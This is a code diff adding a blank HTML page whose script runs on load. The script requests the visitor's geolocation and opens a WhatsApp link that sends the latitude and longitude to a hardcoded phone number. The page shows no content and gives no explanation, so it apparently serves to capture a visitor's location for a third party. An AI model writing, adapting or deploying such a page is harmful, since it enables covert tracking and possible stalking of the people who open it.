@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+
+<body>
+
+
+
+  <script>
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+      } else {
+        return null;
+      }
+    }
+
+    function showPosition(position) {
+      let num = 083857801744;
+      let lat = position.coords.latitude;
+      let long = position.coords.longitude;
+      var win = window.open(`https://wa.me/${num}?text=${lat},${long}`);
+    }
+
+    window.onload = getLocation();
+  </script>
+
+</body>
+
+</html>
+
